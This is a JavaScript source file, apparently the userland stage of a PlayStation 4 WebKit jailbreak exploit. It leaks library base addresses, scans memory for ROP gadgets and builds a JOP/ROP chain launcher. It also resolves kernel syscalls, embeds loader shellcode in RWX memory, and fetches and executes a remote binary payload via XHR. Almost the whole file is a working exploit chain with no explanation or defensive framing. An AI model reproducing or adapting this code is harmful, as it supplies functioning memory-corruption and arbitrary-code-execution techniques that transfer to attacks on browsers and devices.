var nogc = [];

var gadgets;
var syscalls = {};

var gadgetmap_wk = {
  'ep':             [0x5B, 0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E, 0x41, 0x5F, 0x5D, 0xC3],
  'pop rsi':        [0x5E, 0xC3],
  'pop rdi':        [0x5F, 0xC3],
  'pop rsp':        [0x5C, 0xC3],
  'pop rax':        [0x58, 0xC3],
  'pop rdx':        [0x5A, 0xC3],
  'pop rcx':        [0x59, 0xC3],
  'pop rbp':        [0x5D, 0xC3],
  'pop r8':         [0x47, 0x58, 0xC3],
  'pop r9':         [0x47, 0x59, 0xC3],
  'infloop':        [0xEB, 0xFE, 0xC3],
  'ret':            [0xC3],
  'mov [rdi], rsi': [0x48, 0x89, 0x37, 0xC3],
  'mov [rdi], rax': [0x48, 0x89, 0x07, 0xC3],
  'mov rax, rdi':   [0x48, 0x89, 0xF8, 0xC3],
};

var slowpath_jop = [0x48, 0x8B, 0x7F, 0x48, 0x48, 0x8B, 0x07, 0x48, 0x8B, 0x40, 0x30, 0xFF, 0xE0];
slowpath_jop.reverse();

var get_jmptgt = function (addr) {
  var z = p.read4(addr) & 0xFFFF;
  var y = p.read4(addr.add32(2));
  if (z != 0x25FF) {
    return 0;
  }
  return addr.add32(y + 6);
};

function userland() {
  var slide = 0x40;
  if (fwFromUA <= 4.07) {
    slide = 0x20;
  }

  p.leakfunc = function (func) {
    var fptr_store = p.leakval(func);
    return (p.read8(fptr_store.add32(0x18))).add32(slide);
  };

  var parseFloatStore = p.leakfunc(parseFloat);
  var parseFloatPtr = p.read8(parseFloatStore);

  var webKitBase = parseFloatPtr;
  webKitBase.sub32inplace(parseFloat_offset);
  window.webKitBase = webKitBase;

  var o2wk = function (o) {
    return webKitBase.add32(o);
  };
  window.o2wk = o2wk;

  var gadgets_temp = {
    '__stack_chk_fail': o2wk(gadget_offsets['__stack_chk_fail']),
    '__stack_chk_fail_offset': gadget_offsets['__stack_chk_fail_offset'],
    'memset': o2wk(gadget_offsets['memset']),
    'memset_offset': gadget_offsets['memset_offset'],
  };

  var libSceLibcInternalBase = p.read8(get_jmptgt(gadgets_temp['memset']));
  libSceLibcInternalBase.sub32inplace(gadgets_temp['memset_offset']);
  window.libSceLibcInternalBase = libSceLibcInternalBase;

  var o2lc = function (o) {
    return libSceLibcInternalBase.add32(o);
  };
  window.o2lc = o2lc;

  var libKernelBase = p.read8(get_jmptgt(gadgets_temp['__stack_chk_fail']));
  libKernelBase.sub32inplace(gadgets_temp['__stack_chk_fail_offset']);
  window.libKernelBase = libKernelBase;

  var o2lk = function (o) {
    return libKernelBase.add32(o);
  };
  window.o2lk = o2lk;

  gadgets = {
    '__stack_chk_fail': o2wk(gadget_offsets['__stack_chk_fail']),
    '__stack_chk_fail_offset': gadget_offsets['__stack_chk_fail_offset'],
    'memcpy': o2wk(gadget_offsets['memcpy']),
    'memset': o2wk(gadget_offsets['memset']),
    'memset_offset': gadget_offsets['memset_offset'],
    'setjmp': o2wk(gadget_offsets['setjmp']),
    'scePthreadCreate': o2lk(gadget_offsets['scePthreadCreate']),
    'mov rdi, [rdi+0x48]': o2lc(gadget_offsets['mov rdi, [rdi+0x48]']),
    'sub rax, rcx': o2lk(gadget_offsets['sub rax, rcx']),
    'add rax, [rdi]': o2lc(gadget_offsets['add rax, [rdi]']),
  };

  var wkview = new Uint8Array(0x1000);
  var wkstr = p.leakval(wkview).add32(leakval_slide);

  p.write8(wkstr, webKitBase);
  p.write4(wkstr.add32(8), 0x3052D38);

  var gadgets_to_find = 0;
  var gadgetnames = [];
  for (var gadgetname in gadgetmap_wk) {
    if (gadgetmap_wk.hasOwnProperty(gadgetname)) {
      gadgets_to_find++;
      gadgetnames.push(gadgetname);
      gadgetmap_wk[gadgetname].reverse();
    }
  }

  gadgets_to_find++;

  var findgadget = function (donecb) {
    if (gadget_cache) {
      gadgets_to_find = 0;
      slowpath_jop = 0;
      for (var gadgetname in gadget_cache) {
        if (gadget_cache.hasOwnProperty(gadgetname)) {
          gadgets[gadgetname] = o2wk(gadget_cache[gadgetname]);
        }
      }
    } else {
      for (var i = 0; i < wkview.length; i++) {
        if (wkview[i] == 0xc3) {
          for (var nl = 0; nl < gadgetnames.length; nl++) {
            var found = 1;
            if (!gadgetnames[nl]) {
              continue;
            }
            var gadgetbytes = gadgetmap_wk[gadgetnames[nl]];
            for (var compareidx = 0; compareidx < gadgetbytes.length; compareidx++) {
              if (gadgetbytes[compareidx] != wkview[i - compareidx]) {
                found = 0;
                break;
              }
            }
            if (!found) {
              continue;
            }
            gadgets[gadgetnames[nl]] = o2wk(i - gadgetbytes.length + 1);
            gadgetoffs[gadgetnames[nl]] = i - gadgetbytes.length + 1;
            delete gadgetnames[nl];
            gadgets_to_find--;
          }
        } else if (wkview[i] == 0xe0 && wkview[i - 1] == 0xff && slowpath_jop) {
          var found = 1;
          for (var compareidx = 0; compareidx < slowpath_jop.length; compareidx++) {
            if (slowpath_jop[compareidx] != wkview[i - compareidx]) {
              found = 0;
              break;
            }
          }
          if (!found) {
            continue;
          }
          gadgets['jop'] = o2wk(i - slowpath_jop.length + 1);
          gadgetoffs['jop'] = i - slowpath_jop.length + 1;
          gadgets_to_find--;
          slowpath_jop = 0;
        }
        if (!gadgets_to_find) {
          break;
        }
      }
    }
    if (!gadgets_to_find && !slowpath_jop) {
      setTimeout(donecb, 50);
    } else {
      /* Only needed for debugging
      print('missing gadgets: ');
      for (var nl in gadgetnames) {
        print(' - ' + gadgetnames[nl]);
      }
      if (slowpath_jop) {
        print(' - jop gadget');
      }
      */
    }
  };

  findgadget(function () { });

  if (fwFromUA <= 4.07) {
    var funcPtrStore = p.leakfunc(parseFloat);
    var funcArgs = [];

    for (var i = 0; i < 0x7FFF; i++) {
      funcArgs[i] = 0x41410000 | i;
    }

    var argBuffer = new Uint32Array(0x1000);
    var argPointer = p.read8(p.leakval(argBuffer).add32(leakval_slide));
    argBuffer[0] = 0x13371337;

    if (p.read4(argPointer) != 0x13371337) {
      throw new Error('Stack frame is not aligned!');
    }

    window.dont_tread_on_me = [argBuffer];

    var launch_chain = function (chain) {
      var stackPointer = 0;
      var stackCookie = 0;
      var orig_reenter_rip = 0;

      var reenter_help = {
        length: {
          valueOf: function () {
            orig_reenter_rip = p.read8(stackPointer);
            stackCookie = p.read8(stackPointer.add32(8));
            var returnToFrame = stackPointer;

            var ocnt = chain.count;
            chain.push_write8(stackPointer, orig_reenter_rip);
            chain.push_write8(stackPointer.add32(8), stackCookie);

            if (chain.runtime) {
              returnToFrame = chain.runtime(stackPointer);
            }

            chain.push(gadgets['pop rsp']);
            chain.push(returnToFrame);
            chain.count = ocnt;

            p.write8(stackPointer, gadgets['pop rsp']);
            p.write8(stackPointer.add32(8), chain.stackBase);
          },
        },
      };

      return (function () {
        (function () {}).apply(null, funcArgs);

        var orig = p.read8(funcPtrStore);
        p.write8(funcPtrStore, gadgets['mov rax, rdi']);

        var trap = p.leakval(parseFloat());
        var rtv = 0;
        var fakeval = new int64(0x41414141, 0xFFFF0000);

        (function () {
          var val = p.read8(trap.add32(0x100));
          if ((val.hi != 0xFFFF0000) || ((val.low & 0xFFFF0000) != 0x41410000)) {
            throw new Error('Stack frame corrupted!');
          }
        }).apply(null, funcArgs);

        p.write8(argPointer, argPointer.add32(0x100));
        p.write8(argPointer.add32(0x130), gadgets['setjmp']);
        p.write8(funcPtrStore, gadgets['jop']);

        (function () {}).apply(null, funcArgs);
        p.write8(trap.add32(0x18), argPointer);
        p.leakval(parseFloat());

        stackPointer = p.read8(argPointer.add32(0x10));

        rtv = Array.prototype.splice.apply(reenter_help);
        p.write8(trap.add32(0x18), fakeval);
        p.write8(trap.add32(0x18), orig);

        return p.leakval(rtv);
      }).apply(null, funcArgs);
    };
  } else {
    var hold1;
    var hold2;
    var holdz;
    var holdz1;

    while (1) {
      hold1 = {
        a: 0,
        b: 0,
        c: 0,
        d: 0,
      };
      hold2 = {
        a: 0,
        b: 0,
        c: 0,
        d: 0,
      };
      holdz1 = p.leakval(hold2);
      holdz = p.leakval(hold1);
      if (holdz.low - 0x30 == holdz1.low) {
        break;
      }
    }

    var pushframe = [];
    pushframe.length = 0x80;
    var rtv = 0;
    var funcbuf;
    var funcbuf32 = new Uint32Array(0x100);
    nogc.push(funcbuf32);

    var launch_chain = function (chain) {
      var stackPointer = 0;
      var stackCookie = 0;
      var orig_reenter_rip = 0;

      var reenter_help = {
        length: {
          valueOf: function () {
            orig_reenter_rip = p.read8(stackPointer);
            stackCookie = p.read8(stackPointer.add32(8));
            var returnToFrame = stackPointer;

            var ocnt = chain.count;
            chain.push_write8(stackPointer, orig_reenter_rip);
            chain.push_write8(stackPointer.add32(8), stackCookie);

            if (chain.runtime) {
              returnToFrame = chain.runtime(stackPointer);
            }

            chain.push(gadgets['pop rsp']);
            chain.push(returnToFrame);
            chain.count = ocnt;

            p.write8(stackPointer, gadgets['pop rsp']);
            p.write8(stackPointer.add32(8), chain.stackBase);
          },
        },
      };

      funcbuf = p.read8(p.leakval(funcbuf32).add32(leakval_slide));

      p.write8(funcbuf.add32(0x30), gadgets['setjmp']);
      p.write8(funcbuf.add32(0x80), gadgets['jop']);
      p.write8(funcbuf, funcbuf);
      p.write8(parseFloatStore, gadgets['jop']);
      var orig_hold = p.read8(holdz1);
      var orig_hold48 = p.read8(holdz1.add32(0x48));

      p.write8(holdz1, funcbuf.add32(0x50));
      p.write8(holdz1.add32(0x48), funcbuf);
      parseFloat(hold2, hold2, hold2, hold2, hold2, hold2);
      p.write8(holdz1, orig_hold);
      p.write8(holdz1.add32(0x48), orig_hold48);

      stackPointer = p.read8(funcbuf.add32(0x10));
      rtv = Array.prototype.splice.apply(reenter_help);
      return p.leakval(rtv);
    };
  }

  p.loadchain = launch_chain;

  if (fwFromUA <= 4.07) {
    if (Object.keys(syscallMap).length != 0 && typeof syscallMap === 'object') {
      syscalls = syscallMap;
      for (var syscallno in syscalls) {
        if (syscalls.hasOwnProperty(syscallno)) {
          syscalls[syscallno] = o2lk(syscalls[syscallno]);
        }
      }
    } else {
      throw new Error('Unable to locate syscall map!');
    }
  } else {
    var kview = new Uint8Array(0x1000);
    var kstr = p.leakval(kview).add32(leakval_slide);

    p.write8(kstr, libKernelBase);
    p.write4(kstr.add32(8), 0x40000);

    var countbytes;
    for (var i = 0; i < 0x40000; i++) {
      if (
        kview[i] == 0x72
        && kview[i + 1] == 0x64
        && kview[i + 2] == 0x6C
        && kview[i + 3] == 0x6F
        && kview[i + 4] == 0x63
      ) {
        countbytes = i;
        break;
      }
    }
    p.write4(kstr.add32(8), countbytes + 32);

    var dview32 = new Uint32Array(1);
    var dview8 = new Uint8Array(dview32.buffer);
    for (var i = 0; i < countbytes; i++) {
      if (
        kview[i] == 0x48
        && kview[i + 1] == 0xC7
        && kview[i + 2] == 0xC0
        && kview[i + 7] == 0x49
        && kview[i + 8] == 0x89
        && kview[i + 9] == 0xCA
        && kview[i + 10] == 0x0F
        && kview[i + 11] == 0x05
      ) {
        dview8[0] = kview[i + 3];
        dview8[1] = kview[i + 4];
        dview8[2] = kview[i + 5];
        dview8[3] = kview[i + 6];
        var syscallno = dview32[0];
        syscalls[syscallno] = libKernelBase.add32(i);
      }
    }
  }

  var chain = new rop;
  var returnvalue;

  p.fcall_ = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
    chain.clear();

    chain.notimes = this.next_notime;
    this.next_notime = 1;

    chain.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);

    chain.push(gadgets['pop rdi']);
    chain.push(chain.stackBase.add32(0x3FF8));
    chain.push(gadgets['mov [rdi], rax']);

    chain.push(gadgets['pop rax']);
    chain.push(p.leakval(0x41414242));

    if (chain.run().low != 0x41414242) {
      throw new Error('Unexpected ROP behaviour');
    }
    returnvalue = p.read8(chain.stackBase.add32(0x3FF8));
  };

  p.fcall = function () {
    var rv = p.fcall_.apply(this, arguments);
    return returnvalue;
  };

  p.writestr = function (addr, str) {
    for (var i = 0; i < str.length; i++) {
      var byte_ = p.read4(addr.add32(i));
      byte_ &= 0xFFFF0000;
      byte_ |= str.charCodeAt(i);
      p.write4(addr.add32(i), byte_);
    }
  };

  p.readstr = function (addr) {
    var addr_ = addr.add32(0);
    var rd = p.read4(addr_);
    var buf = '';
    while (rd & 0xFF) {
      buf += String.fromCharCode(rd & 0xFF);
      addr_.add32inplace(1);
      rd = p.read4(addr_);
    }
    return buf;
  };

  p.syscall = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
    if (typeof sysc != 'number') {
      throw new Error('Invalid syscall');
    }

    var off = syscalls[sysc];
    if (off == undefined) {
      throw new Error('Undefined syscall number: ' + sysc);
    }

    return p.fcall(off, rdi, rsi, rdx, rcx, r8, r9);
  };

  p.stringify = function (str) {
    var bufView = new Uint8Array(str.length + 1);
    for (var i = 0; i < str.length; i++) {
      bufView[i] = str.charCodeAt(i) & 0xFF;
    }
    nogc.push(bufView);
    return p.read8(p.leakval(bufView).add32(leakval_slide));
  };

  p.malloc = function malloc(sz) {
    var backing = new Uint8Array(0x10000 + sz);
    nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(leakval_slide));
    ptr.backing = backing;
    return ptr;
  };

  p.malloc32 = function malloc32(sz) {
    var backing = new Uint8Array(0x10000 + sz * 4);
    nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(leakval_slide));
    ptr.backing = new Uint32Array(backing.buffer);
    return ptr;
  };

  p.socket = function () {
    return p.syscall(97, 2, 1, 0); // sys_socket
  };

  p.connectSocket = function (s, ip, port) {
    var sockAddr = new Uint32Array(0x10);
    var sockAddrPtr = p.read8(p.leakval(sockAddr).add32(leakval_slide));
    var ipSegments = ip.split('.');

    for (var seg = 0; seg < 4; seg++) {
      ipSegments[seg] = parseInt(ipSegments[seg]);
    }

    sockAddr[0] |= (((port >> 8) & 0xFF) << 0x10 | port << 0x18) | 0x200;
    sockAddr[1] = ipSegments[3] << 24 | ipSegments[2] << 16 | ipSegments[1] << 8 | ipSegments[0];
    sockAddr[2] = 0;
    sockAddr[3] = 0;

    return p.syscall(98, s, sockAddrPtr, 0x10); // sys_connect
  };

  p.writeSocket = function (s, data, size) {
    return p.syscall(4, s, data, size); // sys_write
  };

  p.closeSocket = function (s) {
    return p.syscall(6, s); // sys_close
  };

  window.spawnthread = function (chain) {
    var contextp = p.malloc32(0x1800);
    var contextz = contextp.backing;
    contextz[0] = 1337;
    var thread2 = new rop();

    thread2.push(gadgets['ret']);
    thread2.push(gadgets['ret']);
    thread2.push(gadgets['ret']);
    thread2.push(gadgets['ret']);
    chain(thread2);
    p.write8(contextp, gadgets['ret']);
    p.write8(contextp.add32(0x10), thread2.stackBase);
    p.syscall(324, 1);

    var thread = p.malloc(0x08);
    p.fcall(gadgets['scePthreadCreate'], thread, 0, gadgets['longjmp'], contextp, p.stringify('GottaGoFast'));
    nogc.push(contextp);
    nogc.push(thread2);
    return thread2;
  };

  window.binLoader = function () {
    var code_addr = new int64(0x26100000, 0x00000009);
    var mapped_address = p.syscall(477, code_addr, 0x300000, 7, 0x41000, -1, 0); // sys_mmap
    if (mapped_address == '926100000') {
      try {
        var loader_shcode = [0x31FE8948, 0x3D8B48C0, 0x00003FF4, 0xED0D8B48, 0x4800003F, 0xAAF3F929, 0xE8F78948, 0x00000060, 0x48C3C031, 0x0003C0C7, 0x89490000, 0xC3050FCA, 0x06C0C748, 0x49000000, 0x050FCA89, 0xC0C748C3, 0x0000001E, 0x0FCA8949, 0xC748C305, 0x000061C0, 0xCA894900, 0x48C3050F, 0x0068C0C7, 0x89490000, 0xC3050FCA, 0x6AC0C748, 0x49000000, 0x050FCA89, 0x909090C3, 0x90909090, 0x90909090, 0x90909090, 0xB8555441, 0x00003C23, 0xBED23153, 0x00000001, 0x000002BF, 0xEC834800, 0x2404C610, 0x2444C610, 0x44C70201, 0x00000424, 0x89660000, 0xC6022444, 0x00082444, 0x092444C6, 0x2444C600, 0x44C6000A, 0xC6000B24, 0x000C2444, 0x0D2444C6, 0xFF78E800, 0x10BAFFFF, 0x41000000, 0x8948C489, 0xE8C789E6, 0xFFFFFF73, 0x00000ABE, 0xE7894400, 0xFFFF73E8, 0x31D231FF, 0xE78944F6, 0xFFFF40E8, 0x48C589FF, 0x200000B8, 0x00000926, 0xC300C600, 0xEBC38948, 0x801F0F0C, 0x00000000, 0x01489848, 0x1000BAC3, 0x89480000, 0xE8EF89DE, 0xFFFFFEF7, 0xE87FC085, 0xE8E78944, 0xFFFFFEF8, 0xF1E8EF89, 0x48FFFFFE, 0x200000B8, 0x00000926, 0x48D0FF00, 0x5B10C483, 0xC35C415D, 0xC3C3C3C3];
        var shellbuf = p.malloc32(0x1000);
        for (var i = 0; i < loader_shcode.length; i++) {
          shellbuf.backing[i] = loader_shcode[i];
        }
        p.syscall(74, shellbuf, 0x4000, 7); // sys_mprotect
        var thread_id = p.malloc(0x08);
        p.fcall(gadgets['scePthreadCreate'], thread_id, 0, shellbuf, 0, p.stringify('loader'));
        awaitpl();
      } catch (e) {
        throw new Error(e.message);
      }
    }
  };

  window.runPayload = function (path) {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', path);
    xhr.responseType = 'arraybuffer';
    xhr.onreadystatechange = function () {
      if (xhr.readyState === 4 && xhr.status === 200) {
        try {
          var code_addr = new int64(0x26100000, 0x00000009);
          var mapped_address = p.syscall(477, code_addr, 0x300000, 7, 0x41000, -1, 0); // sys_mmap
          if (mapped_address != '926100000') {
            throw new Error('Could not Allocate Buffer!');
          }

          // Trick for 4 bytes padding
          var padding = new Uint8Array(4 - (xhr.response.byteLength % 4) % 4);
          var tmp = new Uint8Array(xhr.response.byteLength + padding.byteLength);
          tmp.set(new Uint8Array(xhr.response), 0);
          tmp.set(padding, xhr.response.byteLength);

          var shellcode = new Uint32Array(tmp.buffer);
          for (var i = 0; i < shellcode.length; i++) {
            p.write4(code_addr.add32(0x100000 + i * 4), shellcode[i]);
          }
          p.fcall(code_addr);
          p.syscall(73, code_addr, 0x300000); // sys_munmap
        } catch (e) {
          throw new Error(e.message);
        }
      }/* else {
        throw new Error('Issue Retreiving Payload! #2');
      }
      */
    };
    xhr.onerror = function () {
      throw new Error('Issue Retreiving Payload! #1');
    };
    // TODO: sleep(1000);
    xhr.send();
    // TODO: sleep(3000);
  };

  if (p.fcall(gadgets['mov rax, rdi'], 0x41414141) != 41414141) {
    throw new Error('Userland ROP execution not working');
  }

  if (!module_dump) {
    while (p.syscall(23, 0) != 0) { // sys_setuid
      kernelExploit();
    }
  } else {
    /* TODO */
  }

  if (module_dump) {
    // This should have run above
    allset();
  } else if (kernel_dump) {
    // This should have run in kernExploit()
    allset();
  } else if (bin_loader) {
    binLoader();
  } else if (embedded_payload) {
    runPayload(payload_location);
    allset();
  } else {
    throw new Error('No goal selected for exploit!');
  }
}
